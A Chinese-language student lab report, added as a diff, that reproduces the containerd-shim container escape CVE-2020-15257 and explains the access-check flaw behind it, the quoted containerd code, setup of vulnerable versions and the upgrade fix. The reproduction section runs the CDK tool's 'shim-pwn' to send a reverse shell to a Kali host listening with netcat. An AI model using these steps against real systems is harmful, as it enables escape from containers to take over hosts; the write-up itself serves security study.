@@ -1,0 +1,263 @@
+# 	容器逃逸实验
+
+> 马光煜 		2020210665
+
+## 一 漏洞实验环境
+
+复现漏洞：CVE-2020-15257
+
+实验环境：Ubuntu 20.04 LTS 
+
+​					Kali 2023.1
+
+其中kali和ubuntu在同一个网段下，如图所示
+
+![image-20230507102823628](D:\desktop\网站文章\pictures\image-20230507102823628.png)
+
+![image-20230507102852925](D:\desktop\网站文章\pictures\image-20230507102852925.png)
+
+## 漏洞原理
+
+> 一句话介绍：当在docker使用–net=host参数启动，与宿主机共享net namespace时，攻击者可以通过containerd-shim API来操作宿主机上其他的containerd-shim进程，从而发生提权攻击
+
+### 1. 前置知识
+
+Containerd 是Docker的核心组件，负责管理容器的生命周期，包括创建，启动，停止以及删除容器操作。容器在Host网络模式下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸，这个API暴露了一个Unix套接字，允许客户端与其通信。
+
+而且对于containerd-shim的访问控制仅仅验证进程的UID是否为0，（**linux中以root用户启动的进程，进程的uid均为0**）但是没有限制对抽象Unix域套接字的访问，因此当一个Root权限的容器开启了host网络模式就可能造成容器逃逸。
+
+#### 什么是containerd-shim?
+
+docker 对容器的管理和操作基本都是通过 containerd 完成的。
+
+它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。
+
+每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd
+
+### 2. 漏洞触发条件
+
+- 容器使用主机网络`hostnetwork`部署，此时容器和主机共享网络命名空间;
+- 容器使用root用户(即UID为0);
+- `containerd version` <=1.3.7
+
+### 3. 原理剖析
+
+根本原因是：暴露了不该有的 API 接口
+
+```go
+func (b *bundle) shimAddress(namespace string) string {
+	d := sha256.Sum256([]byte(filepath.Join(namespace, b.id)))
+	return filepath.Join(string(filepath.Separator), "containerd-shim", fmt.Sprintf("%x.sock", d))
+}
+```
+
+代码位置在：https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136
+
+containerd 传递 Unix 域套接字文件描述符给 **containerd-shim**。**containerd-shim** 在正式启动之后，会基于父进程（也就是 containerd）传递的 Unix 域套接字文件描述符，建立 gRPC 服务，对外暴露一些 API 用于 container、task 的控制
+
+通过查阅代码，我们大概知道我们如果能正常访问 **containerd-shim** 接口，我们大概能有这些操作
+
+代码位置：https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto
+
+```protobuf
+service Shim {
+	// State returns shim and task state information.
+	rpc State(StateRequest) returns (StateResponse);
+
+	rpc Create(CreateTaskRequest) returns (CreateTaskResponse);
+
+	rpc Start(StartRequest) returns (StartResponse);
+
+	rpc Delete(google.protobuf.Empty) returns (DeleteResponse);
+
+	rpc DeleteProcess(DeleteProcessRequest) returns (DeleteResponse);
+
+	rpc ListPids(ListPidsRequest) returns (ListPidsResponse);
+
+	rpc Pause(google.protobuf.Empty) returns (google.protobuf.Empty);
+
+	rpc Resume(google.protobuf.Empty) returns (google.protobuf.Empty);
+
+	rpc Checkpoint(CheckpointTaskRequest) returns (google.protobuf.Empty);
+
+	rpc Kill(KillRequest) returns (google.protobuf.Empty);
+
+	rpc Exec(ExecProcessRequest) returns (google.protobuf.Empty);
+
+	rpc ResizePty(ResizePtyRequest) returns (google.protobuf.Empty);
+
+	rpc CloseIO(CloseIORequest) returns (google.protobuf.Empty);
+
+	// ShimInfo returns information about the shim.
+	rpc ShimInfo(google.protobuf.Empty) returns (ShimInfoResponse);
+
+	rpc Update(UpdateTaskRequest) returns (google.protobuf.Empty);
+
+	rpc Wait(WaitRequest) returns (WaitResponse);
+}
+```
+
+但是权限控制并不完善，代码位置在：https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80
+
+```go
+func UnixSocketRequireSameUser() UnixCredentialsFunc {
+	euid, egid := os.Geteuid(), os.Getegid()
+	return UnixSocketRequireUidGid(euid, egid)
+}
+
+func requireRoot(ucred *unix.Ucred) error {
+	return requireUidGid(ucred, 0, 0)
+}
+
+func requireUidGid(ucred *unix.Ucred, uid, gid int) error {
+	if (uid != -1 && uint32(uid) != ucred.Uid) || (gid != -1 && uint32(gid) != ucred.Gid) {
+		return errors.Wrap(syscall.EPERM, "ttrpc: invalid credentials")
+	}
+	return nil
+}
+```
+
+仅仅检查了访问进程的 euid 和 egid ，而在默认情况下容器内部的进程都是以 root 用户启动，所以会出现这个问题。
+
+#### poc原理
+
+模仿containerd源代码
+
+```go
+// WithConnect connects to an existing shim
+func WithConnect(address string, onClose func()) Opt {
+        return func(ctx context.Context, config shim.Config) (shimapi.ShimService, io.Closer, error) {
+                conn, err := connect(address, annonDialer)
+                if err != nil {
+                        return nil, nil, err
+                }
+                client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))
+                return shimapi.NewShimClient(client), conn, nil
+        }
+}
+```
+
+首先在/proc/net/unix 里面匹配到目标套接字，然后通过ttrpc建立客户端
+
+这样可以利用Containerd-shim启动一个host主机上面的进程
+
+## 漏洞复现
+
+### 1. 安装有漏洞的docker版本
+
+```she
+apt-get install ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
+
+add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable"
+
+apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1
+```
+
+
+
+![image-20230507093908777](D:\desktop\网站文章\pictures\image-20230507093908777.png)
+
+首先下载需要用到的包
+
+![image-20230507094322820](D:\desktop\网站文章\pictures\image-20230507094322820.png)
+
+添加官方GPG密钥
+
+![image-20230507094824161](D:\desktop\网站文章\pictures\image-20230507094824161.png)
+
+下载指定版本docker
+
+![image-20230507094859680](D:\desktop\网站文章\pictures\image-20230507094859680.png)
+
+​		下载成功后通过docker version 命令看到已经下载成功被漏洞影响的containerd版本
+
+### 2. 复现漏洞
+
+下载ubuntu容器`docker pull ubuntu:18.04`
+
+![image-20230507095058667](D:\desktop\网站文章\pictures\image-20230507095058667.png)
+
+通过`--net=host` 作为启动参数来运行并进入一个容器：`docker run -itd --net=host ubuntu:18.04 /bin/bash`
+
+![image-20230507095148446](D:\desktop\网站文章\pictures\image-20230507095148446.png)
+
+进入容器：`docker exec -it f0223dc8c24c /bin/bash`
+
+![image-20230507095418160](D:\desktop\网站文章\pictures\image-20230507095418160.png)
+
+
+
+接着在容器内查看Unix域套接字：`cat /proc/net/unix|grep -a "containerd-shim"`  可以看到如下api
+
+**@/containerd-shim/{sha256}shim.sock**：
+
+这个就是上文所述的，containerd-shim 监听的 Unix 域套接字，containerd 通过它和 containerd-shim 通信，控制管理容器。**依靠网络命名空间做隔离**
+
+![image-20230507095507869](D:\desktop\网站文章\pictures\image-20230507095507869.png)
+
+
+
+下载exp并实现反弹shell，实现docker逃逸
+
+首先下载poc，不过由于docker容器内部wget的问题，本人无法直接下载
+
+![image-20230507102051652](D:\desktop\网站文章\pictures\image-20230507102051652.png)
+
+后来采用，先在本地下载，之后使用`docker cp`命令将文件复制到docker容器内部
+
+![image-20230507102212791](D:\desktop\网站文章\pictures\image-20230507102212791.png)
+
+之后解压运行`tar -zxvf cdk_v0.1.6_release.tar.gz`  `./cdk_linux_amd64 run shim-pwn 192.168.88.140 6666`
+
+![image-20230507102244422](D:\desktop\网站文章\pictures\image-20230507102244422.png)
+
+中间出现报错是因为没有在同网段的kali开启监听 `nc -lvnp 6666`
+
+kali开启监听后便可以访问主机shell
+
+![image-20230507102415113](D:\desktop\网站文章\pictures\image-20230507102415113.png)
+
+漏洞复现完毕
+
+## 修复方式
+
+升级至`containerd`至最新版或者限制以host方式启动docker
+
+代码原理：
+
+新版代码：
+
+```go
+func UnixSocketRequireUidGid(uid, gid int) UnixCredentialsFunc {
+	return func(ucred *unix.Ucred) error {
+		return requireUidGid(ucred, uid, gid)
+	}
+}
+
+func UnixSocketRequireRoot() UnixCredentialsFunc {
+	return UnixSocketRequireUidGid(0, 0)
+}
+
+// UnixSocketRequireSameUser resolves the current effective unix user and returns a
+// UnixCredentialsFunc that will validate incoming unix connections against the
+// current credentials.
+//
+// This is useful when using abstract sockets that are accessible by all users.
+func UnixSocketRequireSameUser() UnixCredentialsFunc {
+	euid, egid := os.Geteuid(), os.Getegid()
+	return UnixSocketRequireUidGid(euid, egid)
+}
+
+func requireRoot(ucred *unix.Ucred) error {
+	return requireUidGid(ucred, 0, 0)
+}
+
+func requireUidGid(ucred *unix.Ucred, uid, gid int) error {
+	if (uid != -1 && uint32(uid) != ucred.Uid) || (gid != -1 && uint32(gid) != ucred.Gid) {
+		return errors.Wrap(syscall.EPERM, "ttrpc: invalid credentials")
+	}
+	return nil
+}
+```
+
